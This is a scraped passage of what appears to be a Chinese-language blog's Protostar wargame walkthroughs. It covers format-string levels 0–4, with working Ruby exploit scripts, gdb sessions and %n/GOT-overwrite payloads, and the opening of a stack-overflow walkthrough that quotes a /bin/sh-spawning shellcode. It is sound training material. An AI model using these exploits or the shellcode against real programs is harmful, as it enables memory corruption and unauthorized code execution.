ABCD|0x804960c|0xbffff628|0x8048469|0xb7fd8304|0xb7fd7ff4|0xbffff628|0x8048435|0xbffff7fc|0xb7ff1040|0x804845b|0xb7fd7ff4|0x8048450|(nil)|0xbffff6a8|0xb7eadc76|0x2|0xbffff6d4|0xbffff6e0|0xb7fe1848|0xbffff690|0xffffffff|0xb7ffeff4|0x804824d|0x1|0xbffff690|0xb7ff0626|0xb7fffab0|0xb7fe1b28|0xb7fd7ff4|(nil)|(nil)|0xbffff6a8|0xdda5d91d|0xf7f1cf0d|(nil)|(nil)|(nil)|0x2|0x8048340|(nil)|0xb7ff6210|0xb7eadb9b|0xb7ffeff4|0x2|0x8048340|(nil)|0x8048361|0x804841c|0x2|0xbffff6d4|0x8048450|0x8048440|0xb7ff1040|0xbffff6cc|0xb7fff8f8|0x2|0xbffff7e1|0xbffff7fc|(nil)|0xbffff98a|0xbffff998|0xbffff9ac|0xbffff9ce|0xbffff9e1|0xbffff9eb|0xbffffedb|0xbfffff19|0xbfffff2d|0xbfffff36|0xbfffff47|0xbfffff4f|0xbfffff5f|0xbfffff6c|0xbfffffa2|0xbfffffb1|0xbfffffc4|(nil)|0x20|0xb7fe2414|0x21|0xb7fe2000|0x10|0xf8bfbff|0x6|0x1000|0x11|0x64|0x3|0x8048034|0x4|0x20|0x5|0x7|0x7|0xb7fe3000|0x8|(nil)|0x9|0x8048340|0xb|0x3e9|0xc|(nil)|0xd|0x3e9|0xe|0x3e9|0x17|0x1|0x19|0xbffff7cb|0x1f|0xbfffffe1|0xf|0xbffff7db|(nil)|(nil)|0xdc000000|0xdcc44ff8|0x5d311124|0xf251c72e|0x6923116e|0x363836|0x706f2f00|0x72702f74|0x736f746f|0x2f726174|0x2f6e6962|0x6d726f66|0x317461|0x44434241user@protostar:/tmp$ 好耶，看起来第 131 个 %p 就是 argv[1] 开始的地方了！\n接下来看看 %n 的定义：\nThe number of characters written so far is stored into the integer indicated by the int * (or variant) pointer argument. No argument is converted.\n也就是说，可以用来一个地址写入「当前已打印了多少字符」\n只要把 ABCD 换成自己想写的地址，第 131 个 %p 替换成 %n 就能改变这个地址的值了是么！\nScript #1 于是我写出了如下的脚本：\n#!/usr/bin/ruby breadcrumb = \u0026#34;ABCD\u0026#34; # convert ASCII to Hex in Little Endian # str: String # return: String def to_hex(str) return str.unpack(\u0026#39;N*\u0026#39;).pack(\u0026#39;V*\u0026#39;).unpack(\u0026#39;H*\u0026#39;) * \u0026#34;\u0026#34; end index = 1 maximum = 200 while index \u0026lt; maximum command = \u0026#34;/opt/protostar/bin/format1 \u0026#34; + breadcrumb + \u0026#34;%p\u0026#34; * (index + 1) result = `#{command}` puts result if result.include? to_hex(breadcrumb) then break end index += 1 end puts \u0026#34;index: #{index}\u0026#34; # address of target: 0x08049638 target = \u0026#34;\\x38\\x96\\x04\\x08\u0026#34; command = \u0026#34;/opt/protostar/bin/format1 \u0026#34; + target + (\u0026#34;%p\u0026#34; * index) + \u0026#34;%n\u0026#34; puts \u0026#34;Running: #{command}\u0026#34; puts `#{command}` 这个脚本的思路很简单：\n每次都多打印一个 %p 如果在返回里检测到了 breadcrumb 的小端序值（这里面包屑是 ABCD，对应的值是 44434241）那么就停下来 记住到底打印了多少个 %p 才到了栈上 argv[1] 的位置 把面包屑 breadcrumb 替换成要写的地址，打印同样多的 %p 但把最后一个 %p 替换成 %n 结束 Unpack, Pack, MAGIC Method: Array#pack\n有一个很奇怪的东西姑且也作为笔记记下来吧\n也就是这个脚本里的 def to_hex(str)\n它只做了一件事，就是 return str.unpack('N*').pack('V*').unpack('H*') * \u0026quot;\u0026quot;\n然后就可以把一串 ASCII 变成小端序的十六进制值\n这 是 魔 法\n开一个 irb 来看看到底发生了什么吧\nirb(main):009:0\u0026gt; tmp = \u0026#34;ABCD\u0026#34; =\u0026gt; \u0026#34;ABCD\u0026#34; irb(main):010:0\u0026gt; tmp = tmp.unpack(\u0026#39;N*\u0026#39;) =\u0026gt; [1094861636] irb(main):011:0\u0026gt; tmp = tmp.pack(\u0026#39;V*\u0026#39;) =\u0026gt; \u0026#34;DCBA\u0026#34; irb(main):012:0\u0026gt; tmp = tmp.unpack(\u0026#39;H*\u0026#39;) =\u0026gt; [\u0026#34;44434241\u0026#34;] irb(main):013:0\u0026gt; tmp = tmp * \u0026#34;\u0026#34; =\u0026gt; \u0026#34;44434241\u0026#34; irb(main):014:0\u0026gt; tmp.class =\u0026gt; String 可见分为了以下步骤\ntmp.unpack('N*')\n把 String 类型的 tmp 转换成 32 bit 的整型，小端序。注意，从这里开始 tmp 的类型是 Array 了\ntmp.pack('V*')\n把 tmp 编码成字符串，大端序\ntmp = tmp.unpack('H*')\n把 tmp 编码成十六进制\ntmp = tmp * \u0026quot;\u0026quot;\n把 Array 类型的 tmp 转换成 String 类型\nBreadcrumb is not in the last %p 可是执行这个脚本的时候却出现了这样的结果：\n...664106e50xf1fcc6110xabeb1fff0x6916e02d0x363836(nil)0x706f2f000x72702f740x736f746f0x2f7261740x2f6e69620x6d726f660x3174610x444342410x70257025 index: 132 Running: /opt/..... 打印了 132 个 %p ，然后确实出现了 0x444342410，但是却..不在最后一个 %p 上..而是在第 131 个\n那为什么不在打印了 131 个 %p 后就停下来呢\u0026hellip;\n幸好每次增加一个 %p 的结果都有输出，让我们往上翻看一下 131 个 %p 时是什么情况\u0026hellip;\n......0x69622f720x6f662f6e0x74616d720x42410031 为什么打印 131 个 %p 时出现了 0x42410031\u0026hellip;\n44 和 43 去哪里了呢\u0026hellip;\n我们回到开头那句命令\n/opt/protostar/bin/format1 `ruby -e \u0026#39;puts \u0026#34;ABCD\u0026#34; + \u0026#34;|%p\u0026#34;*133 \u0026#39;`` 重新测试一下：\n# pwd: / # %p * 133 |0x616d726f|0x41003174|0x7c444342user@protostar:/$ # %p * 134 |0x317461|0x44434241|0x7c70257c|0x257c7025user@protostar:/$ # %p * 135 |0x726f662f|0x3174616d|0x43424100|0x70257c44|0x7c70257c|0x257c7025|0x70257c70user@protostar:/$ 会发现面包屑对应的十六进制无法出现在一个 4 bytes 上，\n且就算出现在了一个 4 bytes 里也并不出现在最后一个%p\n这也就导致了那个脚本无法使用\n到底怎么会是呢\u0026hellip;\nPwd, Alignment, Environment Variables 不知道读者有没有注意到一点，\n在最开始那个 44434241 完美出现在一个 4 bytes 里，还是在最后一个 %p 的情况，\n它的工作目录是：/tmp\n而上面那个无法对齐又不在最后一个的情况，工作目录是：/\n看来大概的确是环境变量的问题，让我们开个 gdb 验证一下\n检视一下栈的位置：\n(gdb) info proc map process 7506 cmdline = \u0026#39;/opt/protostar/bin/format1\u0026#39; cwd = \u0026#39;/\u0026#39; exe = \u0026#39;/opt/protostar/bin/format1\u0026#39; Mapped address spaces: Start Addr End Addr Size Offset objfile 0x8048000 0x8049000 0x1000 0 /opt/protostar/bin/format1 0x8049000 0x804a000 0x1000 0 /opt/protostar/bin/format1 0xb7e96000 0xb7e97000 0x1000 0 0xb7e97000 0xb7fd5000 0x13e000 0 /lib/libc-2.11.2.so 0xb7fd5000 0xb7fd6000 0x1000 0x13e000 /lib/libc-2.11.2.so 0xb7fd6000 0xb7fd8000 0x2000 0x13e000 /lib/libc-2.11.2.so 0xb7fd8000 0xb7fd9000 0x1000 0x140000 /lib/libc-2.11.2.so 0xb7fd9000 0xb7fdc000 0x3000 0 0xb7fe0000 0xb7fe2000 0x2000 0 0xb7fe2000 0xb7fe3000 0x1000 0 [vdso] 0xb7fe3000 0xb7ffe000 0x1b000 0 /lib/ld-2.11.2.so 0xb7ffe000 0xb7fff000 0x1000 0x1a000 /lib/ld-2.11.2.so 0xb7fff000 0xb8000000 0x1000 0x1b000 /lib/ld-2.11.2.so 0xbffeb000 0xc0000000 0x15000 0 [stack] 可以看到是从 0xbffeb000 到 0xc0000000\n接下来找找 argv[1] 的地址：\n(gdb) disassemble main Dump of assembler code for function main: 0x0804841c \u0026lt;main+0\u0026gt;:\tpush ebp 0x0804841d \u0026lt;main+1\u0026gt;:\tmov ebp,esp 0x0804841f \u0026lt;main+3\u0026gt;:\tand esp,0xfffffff0 0x08048422 \u0026lt;main+6\u0026gt;:\tsub esp,0x10 0x08048425 \u0026lt;main+9\u0026gt;:\tmov eax,DWORD PTR [ebp+0xc] 0x08048428 \u0026lt;main+12\u0026gt;:\tadd eax,0x4 0x0804842b \u0026lt;main+15\u0026gt;:\tmov eax,DWORD PTR [eax] 0x0804842d \u0026lt;main+17\u0026gt;:\tmov DWORD PTR [esp],eax 0x08048430 \u0026lt;main+20\u0026gt;:\tcall 0x80483f4 \u0026lt;vuln\u0026gt; 0x08048435 \u0026lt;main+25\u0026gt;:\tleave 0x08048436 \u0026lt;main+26\u0026gt;:\tret End of assembler dump. 在 call 0x80483f4 \u0026lt;vuln\u0026gt; 设置断点并查看 EAX 指向的值就是 argv[1]\n(gdb) break *0x08048430 Note: breakpoint 2 also set at pc 0x8048430. Breakpoint 3 at 0x8048430: file format1/format1.c, line 19. (gdb) r ABCD1234 Starting program: /opt/protostar/bin/format1 ABCD1234 Breakpoint 2, 0x08048430 in main (argc=2, argv=0xbffff844) at format1/format1.c:19 19\tin format1/format1.c (gdb) info registers eax 0xbffff987\t-1073743481 ecx 0x4fa715d9\t1336350169 edx 0x2\t2 ebx 0xb7fd7ff4\t-1208123404 esp 0xbffff780\t0xbffff780 ebp 0xbffff798\t0xbffff798 esi 0x0\t0 edi 0x0\t0 eip 0x8048430\t0x8048430 \u0026lt;main+20\u0026gt; eflags 0x200286\t[ PF SF IF ID ] cs 0x73\t115 ss 0x7b\t123 ds 0x7b\t123 es 0x7b\t123 fs 0x0\t0 gs 0x33\t51 可以看到 EAX 的地址是 0xbffff987\n为了方便演示，我这里把 EAX 的地址 0xbffff987 前面的一部分内容也打印出来，就从 0xbffff970 开始吧\n使用 x/20s 即：[Examine] / [next 20 values] [String]\n(gdb) x/20s 0xbffff970 0xbffff970:\t\u0026#34;/protostar/bin/format1\u0026#34; 0xbffff987:\t\u0026#34;ABCD1234\u0026#34; 0xbffff990:\t\u0026#34;USER=user\u0026#34; 0xbffff99a:\t\u0026#34;SSH_CLIENT=192.168.2..... 可以看到，argv[1] = ABCD1234 时，地址是 0xbffff987\nargv[1] 后面出现的那些是环境变量，我们暂时不用去管\n接下来试着给 argv[1] 增加字符\u0026hellip;.\n(gdb) r ABCD12345 (gdb) x/20s 0xbffff970 0xbffff970:\t\u0026#34;protostar/bin/format1\u0026#34; 0xbffff986:\t\u0026#34;ABCD12345\u0026#34; 0xbffff990:\t\u0026#34;USER=user\u0026#34; (gdb) r ABCD123456 (gdb) x/20s 0xbffff970 0xbffff970:\t\u0026#34;rotostar/bin/format1\u0026#34; 0xbffff985:\t\u0026#34;ABCD123456\u0026#34; 0xbffff990:\t\u0026#34;USER=user\u0026#34; (gdb) r ABCD1234567 (gdb) x/20s 0xbffff970 0xbffff970:\t\u0026#34;otostar/bin/format1\u0026#34; 0xbffff984:\t\u0026#34;ABCD1234567\u0026#34; 0xbffff990:\t\u0026#34;USER=user\u0026#34; 0xbffff99a:\t\u0026#34;SSH_CL... 可以看到随着参数的逐渐加长，argv[1] 的地址逐渐在减小\u0026hellip;\n但是这又怎么会影响 printf 读到的内容呢..\n因为就算argv[1] 的地址逐渐减小，那 printf 的地址也会逐渐减小的啊，一次减小一个 bytes 的话，printf 的地址到 argv[1] 的地址中间的距离应该不变才对\u0026hellip;\nEAX, EBP, Buffer 上面的设想是错的，实际上 printf 的地址到 argv[1] 的地址中间的距离确实地改变了\n依然用 gdb 做个实验吧，在 call 0x80483f4 \u0026lt;vuln\u0026gt; 设置断点\n(gdb) disassemble main Dump of assembler code for function main: 0x0804841c \u0026lt;main+0\u0026gt;:\tpush ebp 0x0804841d \u0026lt;main+1\u0026gt;:\tmov ebp,esp 0x0804841f \u0026lt;main+3\u0026gt;:\tand esp,0xfffffff0 0x08048422 \u0026lt;main+6\u0026gt;:\tsub esp,0x10 0x08048425 \u0026lt;main+9\u0026gt;:\tmov eax,DWORD PTR [ebp+0xc] 0x08048428 \u0026lt;main+12\u0026gt;:\tadd eax,0x4 0x0804842b \u0026lt;main+15\u0026gt;:\tmov eax,DWORD PTR [eax] 0x0804842d \u0026lt;main+17\u0026gt;:\tmov DWORD PTR [esp],eax 0x08048430 \u0026lt;main+20\u0026gt;:\tcall 0x80483f4 \u0026lt;vuln\u0026gt; 0x08048435 \u0026lt;main+25\u0026gt;:\tleave 0x08048436 \u0026lt;main+26\u0026gt;:\tret End of assembler dump. (gdb) break *0x08048430 Breakpoint 1 at 0x8048430: file format1/format1.c, line 19. 然后改变参数的长度\u0026hellip;\n(gdb) r ABCD1234AB Starting program: /opt/protostar/bin/format1 ABCD1234AB Breakpoint 1, 0x08048430 in main (argc=2, argv=0xbffff844) at format1/format1.c:19 19\tin format1/format1.c (gdb) info registers eax 0xbffff97c\t-1073743492 ecx 0xad015181\t-1392422527 edx 0x2\t2 ebx 0xb7fd7ff4\t-1208123404 esp 0xbffff780\t0xbffff780 ebp 0xbffff798\t0xbffff798 esi 0x0\t0 (gdb) r ABCD1234ABC The program being debugged has been started already. Start it from the beginning? (y or n) y Starting program: /opt/protostar/bin/format1 ABCD1234ABC Breakpoint 1, 0x08048430 in main (argc=2, argv=0xbffff844) at format1/format1.c:19 19\tin format1/format1.c (gdb) info registers eax 0xbffff97b\t-1073743493 ecx 0x912d21cc\t-1859313204 edx 0x2\t2 ebx 0xb7fd7ff4\t-1208123404 esp 0xbffff780\t0xbffff780 ebp 0xbffff798\t0xbffff798 esi 0x0\t0 (gdb) r ABCD1234ABCD Starting program: /opt/protostar/bin/format1 ABCD1234ABCD Breakpoint 1, 0x08048430 in main (argc=2, argv=0xbffff834) at format1/format1.c:19 19\tin format1/format1.c (gdb) info registers eax 0xbffff97a\t-1073743494 ecx 0xadac7a9d\t-1381205347 edx 0x2\t2 ebx 0xb7fd7ff4\t-1208123404 esp 0xbffff770\t0xbffff770 ebp 0xbffff788\t0xbffff788 esi 0x0\t0 可以看到，从 ABCD1234AB 到 ABCD1234ABC 时，EAX 确实减小了一，但 EBP 的值没变\n从 ABCD1234ABC 到 ABCD1234ABCD 时，EAX 确实减小了一，\n但 EBP\u0026hellip;从 0xbffff798 到 0xbffff788，减小了 16\u0026hellip;\n那 EBP 是什么呢？\n我们可以看到在 main() 的汇编代码的第一行出现了 0x0804841c \u0026lt;main+0\u0026gt;:\tpush ebp\n而这里的 EBP 就是 main 函数在栈中开始读写数据的位置\n☞ 建议看看这些\n推测有那么一个 16 bytes 的 buffer，每当 buffer 塞满时，主程序所占的栈空间就整体下移 16 bytes，具体体现在 EBP 减小了 16\n至于原因\u0026hellip;？类似硬盘的 4K 对齐？\n总之这就是为什么我们用 %p 来打印 4 bytes 时 44434241 无法出现在同一个 %p 内的原因，毕竟每次参数长度的改变都会改变argv[1] 的地址\n虽然原理是知道了，但总感觉好像无解x\nScript #2 于是稍微修改了一下先前的脚本，现在的脚本思路是：\n每次都多打印一个 %p 如果在返回里检测到了 breadcrumb 的小端序值（这里面包屑是 ABCD，对应的值是 44434241）那么就停下来 记录输出中第几个 %p 的位置对应着面包屑十六进制值 记录到底打印了多少个 %p 才到了栈上 argv[1] 的位置 把面包屑 breadcrumb 替换成要写的地址，打印同样多的 %p 但把第三步中记录的 %p 换成 %n 结束 #!/usr/bin/ruby # convert ASCII to Hex in Little Endian # str: String # return: String def to_hex(str) # convert to 32 bit integers in small endian # the tmp is Array tmp = str.unpack(\u0026#39;N*\u0026#39;) # encode these integers with big endian tmp = tmp.pack(\u0026#39;V*\u0026#39;) # encode the result in hexadecimal tmp = tmp.unpack(\u0026#39;H*\u0026#39;) # convert Array to String return tmp * \u0026#34;\u0026#34; end # address of target: 0x08049638 target = \u0026#34;\\x38\\x96\\x04\\x08\u0026#34; breadcrumb = \u0026#34;ABCD\u0026#34; times = 1 maximum = 200 while times \u0026lt;= maximum command = \u0026lt;\u0026lt;-END /opt/protostar/bin/format1 \u0026#34;#{breadcrumb} #{\u0026#34;%p \u0026#34; * times}\u0026#34; END result = `#{command}` if result.include? to_hex(breadcrumb) then break end if times == maximum then abort(\u0026#34;err\u0026#34;) end times += 1 end puts result puts \u0026#34;\u0026gt; %p appeared #{times} times\u0026#34; breadcrumb_index = result.split.index(\u0026#34;0x\u0026#34; + to_hex(breadcrumb)) puts \u0026#34;\u0026gt; breadcrumb appeared in the #{breadcrumb_index} %p\u0026#34; command = \u0026lt;\u0026lt;-END /opt/protostar/bin/format1 \u0026#34;#{target} #{\u0026#34;%p \u0026#34; * (breadcrumb_index - 1)}%n #{\u0026#34;%p \u0026#34; * (times - breadcrumb_index)}\u0026#34; END puts \u0026#34;\u0026gt; exec: #{command}\u0026#34; puts `#{command}` 完成w\n","date":"2022-03-31T00:00:00Z","image":"/p/protostar_format_1/cover_hu496a20f2b4777c05e734bfc6b70c220b_1249701_120x120_fill_box_smart1_3.png","permalink":"/p/protostar_format_1/","title":"格式，参数，红宝石"},{"content":"所有的 ruby 脚本已经放在了这里\nProtostar ☞ Protostar\nProtostar introduces the following in a friendly way:\nNetwork programming Byte order Handling sockets Stack overflows Format strings Heap overflows The above is introduced in a simple way, starting with simple memory corruption and modification, function redirection, and finally executing custom shellcode. In order to make this as easy as possible to introduce Address Space Layout Randomisation and Non-Executable memory has been disabled. If you are interested in covering ASLR and NX memory, please see the Fusion page.\nFormat Zero This level introduces format strings, and how attacker supplied format strings can modify the execution flow of programs.\nHints\nThis level should be done in less than 10 bytes of input. “Exploiting format string vulnerabilities” This level is at /opt/protostar/bin/format0\n#include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; void vuln(char *string) { volatile int target; char buffer[64]; target = 0; sprintf(buffer, string); if(target == 0xdeadbeef) { printf(\u0026#34;you have hit the target correctly :)\\n\u0026#34;); } } int main(int argc, char **argv) { vuln(argv[1]); } 总感觉这其实算 Stack 的题x\n没有太多能说的..\n#!/usr/bin/ruby padding = \u0026#34;%64d\u0026#34;; deadbeef = \u0026#34;\\xef\\xbe\\xad\\xde\u0026#34;; command = \u0026lt;\u0026lt;-END /opt/protostar/bin/format0 #{padding + deadbeef} END puts `#{command}` 唯一需要说明的就是 %64d 的作用是对 char buffer[64] 填充 64 个空格进行占位\nFormat One 由于比较奇怪所以放在了这里\nFormat Two This level moves on from format1 and shows how specific values can be written in memory.\nThis level is at /opt/protostar/bin/format2\n#include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; int target; void vuln() { char buffer[512]; fgets(buffer, sizeof(buffer), stdin); printf(buffer); if(target == 64) { printf(\u0026#34;you have modified the target :)\\n\u0026#34;); } else { printf(\u0026#34;target is %d :(\\n\u0026#34;, target); } } int main(int argc, char **argv) { vuln(); } 首先依然是用 objdump 来找到 target 的地址，是 0x080496e4\n接下来需要知道我们输入的数据被存在了栈的哪里\nuser@protostar:/tmp/format$ /opt/protostar/bin/format2 ABCD%08x|%08x|%08x|%08x|%08x|%08x ABCD00000200|b7fd8420|bffff5d4|44434241|78383025|3830257c target is 0 :( 可以看到 ABCD 的 ASCII 也就是 44434241 出现在了第 4 个 %08x\ntarget = \u0026#34;\\xe4\\x96\\x04\\x08\u0026#34; stdin = target + \u0026#34;%60x%4$n\u0026#34; # echo 使用单引号，避免把 %4$n 解析成变量 command = \u0026#34;echo \u0026#39;#{stdin}\u0026#39; | /opt/protostar/bin/format2\u0026#34; puts `#{command}` target 也就是 \\xe4\\x96\\x04\\x08 是 4 bytes 再加上 60 个 bytes 的话也就是 64 了\n所以使用 %60x%4$n\n%60x 打印 60 个 bytes %4$n 选取第 4 个参数（也就是上面说 ABCD 出现在第 4 个 %08x）写入「当前打印了多少字符」 Format Three This level advances from format2 and shows how to write more than 1 or 2 bytes of memory to the process. This also teaches you to carefully control what data is being written to the process memory.\nThis level is at /opt/protostar/bin/format3\n#include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; int target; void printbuffer(char *string) { printf(string); } void vuln() { char buffer[512]; fgets(buffer, sizeof(buffer), stdin); printbuffer(buffer); if(target == 0x01025544) { printf(\u0026#34;you have modified the target :)\\n\u0026#34;); } else { printf(\u0026#34;target is %08x :(\\n\u0026#34;, target); } } int main(int argc, char **argv) { vuln(); } objdump 找到 target 的地址是 0x080496f4\n我们的目标是让这个地址上的值为 0x01025544\nuser@protostar:/tmp/format$ /opt/protostar/bin/format3 ABCD%08x|%08x|%08x|%08x|%08x|%08x|%08x|%08x|%08x|%08x|%08x|%08x|%08x|%08x|%08x|%08x ABCD00000000|bffff590|b7fd7ff4|00000000|00000000|bffff798|0804849d|bffff590|00000200|b7fd8420|bffff5d4|44434241|78383025|3830257c|30257c78|257c7838 target is 00000000 :( 可见 ABCD 出现在第 12 个 %08x，可以稍后替换成我们所需要的地址\n所以可以使用 %12$n 来选取第 12 个参数\n0x01025544 这个值其实可以分成三步来写：\n在 0x080496f4 写入 0x44 也就是十进制 68 在 0x080496f5 写入 0x55 也就是十进制 85 在 0x080496f6 写入 0x0102 也就是十进制 258 为什么是写 0x0102 而不是分成两个来写呢？\n因为我们只能用 %n 来写入，而 %n 写入的值是「当前打印了多少字符」\n所以下一个值永远只能大于上一个值\n如果直接写0x02 的话就小于 0x55，是无法做到的\ntarget = \u0026#34;\\xf4\\x96\\x04\\x08\u0026#34; + \u0026#34;\\xf5\\x96\\x04\\x08\u0026#34; + \u0026#34;\\xf6\\x96\\x04\\x08\u0026#34; # 68 = 56 + 12，这里的 12 是因为 target 已经有 12 bytes 了 f4 = \u0026#34;%56x\u0026#34; + \u0026#34;%12$n\u0026#34; # 但这里的 12 是因为上文提到 ABCD 出现在第 12 个参数 # 85 = 68 + 17 f5 = \u0026#34;%17x\u0026#34; + \u0026#34;%13$n\u0026#34; # 258 = 85 + 173 f6 = \u0026#34;%173x\u0026#34; + \u0026#34;%14$n\u0026#34; # echo 使用单引号，避免把 %?$n 解析成变量 command = \u0026lt;\u0026lt;-END echo \u0026#39;#{target}#{f4+f5+f6}\u0026#39; | /opt/protostar/bin/format3 END puts command puts `#{command}` Format Four format4 looks at one method of redirecting execution in a process.\nHints:\nobjdump -TR is your friend This level is at /opt/protostar/bin/format4\n#include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; int target; void hello() { printf(\u0026#34;code execution redirected! you win\\n\u0026#34;); _exit(1); } void vuln() { char buffer[512]; fgets(buffer, sizeof(buffer), stdin); printf(buffer); exit(1); } int main(int argc, char **argv) { vuln(); } user@protostar:/tmp/format$ objdump -TR /opt/protostar/bin/format4 /opt/protostar/bin/format4: file format elf32-i386 DYNAMIC SYMBOL TABLE: 00000000 w D *UND*\t00000000 __gmon_start__ 00000000 DF *UND*\t00000000 GLIBC_2.0 fgets 00000000 DF *UND*\t00000000 GLIBC_2.0 __libc_start_main 00000000 DF *UND*\t00000000 GLIBC_2.0 _exit 00000000 DF *UND*\t00000000 GLIBC_2.0 printf 00000000 DF *UND*\t00000000 GLIBC_2.0 puts 00000000 DF *UND*\t00000000 GLIBC_2.0 exit 080485ec g DO .rodata\t00000004 Base _IO_stdin_used 08049730 g DO .bss\t00000004 GLIBC_2.0 stdin DYNAMIC RELOCATION RECORDS OFFSET TYPE VALUE 080496fc R_386_GLOB_DAT __gmon_start__ 08049730 R_386_COPY stdin 0804970c R_386_JUMP_SLOT __gmon_start__ 08049710 R_386_JUMP_SLOT fgets 08049714 R_386_JUMP_SLOT __libc_start_main 08049718 R_386_JUMP_SLOT _exit 0804971c R_386_JUMP_SLOT printf 08049720 R_386_JUMP_SLOT puts 08049724 R_386_JUMP_SLOT exit DYNAMIC RELOCATION RECORDS 中，GLIBC exit 函数实际指向的地址是 0x08049724\n所以目标就是在 0x08049724 写入 void hello() 的地址，也就是 0x080484b4\nuser@protostar:/tmp/format$ /opt/protostar/bin/format4 ABCD%08x|%08x|%08x|%08x|%08x|%08x ABCD00000200|b7fd8420|bffff5d4|44434241|78383025|3830257c ABCD 出现在第 4 个参数\n接下来考虑一下如何写入 0x080484b4 这个值\n可以分为三步：\n在 0x08049724 写入 0xb4 也就是十进制 180 因为第二个值只能大于第一个值，所以在 0x08049725 写入 0x0484 也就是十进制 1156 因为第三个值只能大于第二个值，而 0x08 怎么看都小于 0x0484，所以可以写入 0x0508。05 是随便的一个数字，目标仅仅只是让整个值大于第二个。同时我们并不关心这里的 0x05 到底被写哪去了，我们只需要使 0x08049727 这个 byte 上确实是 0x08 就可以了。以及 0x0508 的十进制是 1288 target = \u0026#39;\\x24\\x97\\x04\\x08\u0026#39; + \u0026#39;\\x25\\x97\\x04\\x08\u0026#39; + \u0026#39;\\x27\\x97\\x04\\x08\u0026#39; # 180 = 168 + 12：target 已经是 12 bytes 了 h24 = \u0026#34;%168x\u0026#34; + \u0026#34;%4$n\u0026#34; # 1156 = 976 + 180 h25 = \u0026#34;%976x\u0026#34; + \u0026#34;%5$n\u0026#34; # 1288 = 1156 + 132 h27 = \u0026#34;%132x\u0026#34; + \u0026#34;%6$n\u0026#34; command = \u0026lt;\u0026lt;-END ruby -e \u0026#39;puts \u0026#34;#{target}#{h24+h25+h27}\u0026#34;\u0026#39; | /opt/protostar/bin/format4 END puts command system(command) 这里有个很奇怪的问题，也就是 target 中的 \\x27 对应着 ASCII 中的单引号，结果会让 echo 以为语句已经结束了\u0026hellip;\n解决办法姑且是换成 ruby -e\n但还有个很奇怪的问题，如果要执行的语句里含有 ruby -e 那么 puts `#{command}` 是完全没有任何输出的\u0026hellip;甚至可能没有执行\n所以只能换成 system(command) 了\n顺带一提 puts `#{command}` 的 Markdown 语法是\n``puts `#{command}` `` ","date":"2022-03-30T00:00:00Z","permalink":"/p/protostar_format_0-4/","title":"Protostar Format 0-4 Walkthrough"},{"content":"所有的 python 脚本已经放在了这里\nProtostar ☞ Protostar\nProtostar introduces the following in a friendly way:\nNetwork programming Byte order Handling sockets Stack overflows Format strings Heap overflows The above is introduced in a simple way, starting with simple memory corruption and modification, function redirection, and finally executing custom shellcode. In order to make this as easy as possible to introduce Address Space Layout Randomisation and Non-Executable memory has been disabled. If you are interested in covering ASLR and NX memory, please see the Fusion page.\nshell-storm ☞ shell-storm\n有各种各样的 Shellcode\n比较常用的是这个\n/* * $Id: gets-linux.c,v 1.3 2004/06/02 12:22:30 raptor Exp $ * * gets-linux.c - stdin re-open shellcode for Linux/x86 * Copyright (c) 2003 Marco Ivaldi \u0026lt;raptor@0xdeadbeef.info\u0026gt; * * Local shellcode for stdin re-open and /bin/sh exec. It closes stdin * descriptor and re-opens /dev/tty, then does an execve() of /bin/sh. * Useful to exploit some gets() buffer overflows in an elegant way... */ char sc[] = \u0026#34;\\x31\\xc0\\x31\\xdb\\xb0\\x06\\xcd\\x80\u0026#34; \u0026#34;\\x53\\x68/tty\\x68/dev\\x89\\xe3\\x31\\xc9\\x66\\xb9\\x12\\x27\\xb0\\x05\\xcd\\x80\u0026#34; \u0026#34;\\x31\\xc0\\x50\\x68//sh\\x68/bin\\x89\\xe3\\x50\\x53\\x89\\xe1\\x99\\xb0\\x0b\\xcd\\x80\u0026#34;; 乱七八糟的笔记 正常情况下在一个函数看来栈的布局 [higher memory] caller\u0026rsquo;s frame argument passed by the caller return address saved ebp ☜ ebp local variable 1 local variable 2 local variable 3 ☜ esp [lower memory] 关于 gdb 的 x/ 命令用法： x /[Length][Format] [Address expression]\n例： x/24wx $esp x/2i $eip\ndefine hook-stop 的用法：\ninfo registers x/24wx $esp x/2i $eip end 以及：\n(gdb) set disassembly-flavor intel $ ls -al /opt/protostar/bin/ | grep stack -rwsr-xr-x 1 root root 22412 Nov 24 2011 stack0 -rwsr-xr-x 1 root root 23196 Nov 24 2011 stack1 -rwsr-xr-x 1 root root 23350 Nov 24 2011 stack2 -rwsr-xr-x 1 root root 23130 Nov 24 2011 stack3 -rwsr-xr-x 1 root root 22860 Nov 24 2011 stack4 -rwsr-xr-x 1 root root 22612 Nov 24 2011 stack5 -rwsr-xr-x 1 root root 23331 Nov 24 2011 stack6 -rwsr-xr-x 1 root root 23461 Nov 24 2011 stack7 Stack Zero ~ Three ☞ 为了避免太长就被隐藏在这里了x\nStack Four Stack4 takes a look at overwriting saved EIP and standard buffer overflows.\nThis level is at /opt/protostar/bin/stack4\nHints\nA variety of introductory papers into buffer overflows may help. gdb lets you do “run \u0026lt; input” EIP is not directly after the end of buffer, compiler padding can also increase the size. #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; void win() { printf(\u0026#34;code flow successfully changed\\n\u0026#34;); } int main(int argc, char **argv) { char buffer[64]; gets(buffer); } 首先 objdump 找到 void win() 的地址\nuser@protostar:/opt/protostar/bin$ objdump -t /opt/protostar/bin/stack4 | grep win 080483f4 g F .text\t00000014 win 然后，如何知道 main() 会返回到哪里呢\u0026hellip;.\n(gdb) disassemble main Dump of assembler code for function main: 0x08048408 \u0026lt;main+0\u0026gt;:\tpush %ebp 0x08048409 \u0026lt;main+1\u0026gt;:\tmov %esp,%ebp 0x0804840b \u0026lt;main+3\u0026gt;:\tand $0xfffffff0,%esp 0x0804840e \u0026lt;main+6\u0026gt;:\tsub $0x50,%esp 0x08048411 \u0026lt;main+9\u0026gt;:\tlea 0x10(%esp),%eax 0x08048415 